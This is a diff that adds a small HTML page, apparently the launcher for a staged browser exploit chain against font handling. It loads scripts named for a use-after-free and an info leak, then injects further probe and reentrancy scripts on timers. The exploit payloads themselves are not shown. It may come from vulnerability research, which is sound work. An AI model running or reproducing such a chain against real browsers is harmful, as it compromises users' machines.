@@ -1,0 +1,22 @@
+<!doctype html><html><head><meta charset="utf-8"><title>v80-fontchain</title>
+</head><body>
+<script src="p250-rab-set-uaf.js?v=250c"></script>
+<script src="p252-ft-infoleak.js?v=252a"></script>
+<script>
+setTimeout(function() {
+  var s = document.createElement('script');
+  s.src = 'p250-svgfont-probe.js?v=250a';
+  document.body.appendChild(s);
+}, 20000);
+setTimeout(function() {
+  var s = document.createElement('script');
+  s.src = 'p251-fontset-refwrap.js?v=251a';
+  document.body.appendChild(s);
+}, 40000);
+setTimeout(function() {
+  var s = document.createElement('script');
+  s.src = 'p229-fontloader-reentrant-v2.js?v=229a';
+  document.body.appendChild(s);
+}, 60000);
+</script>
+</body></html>
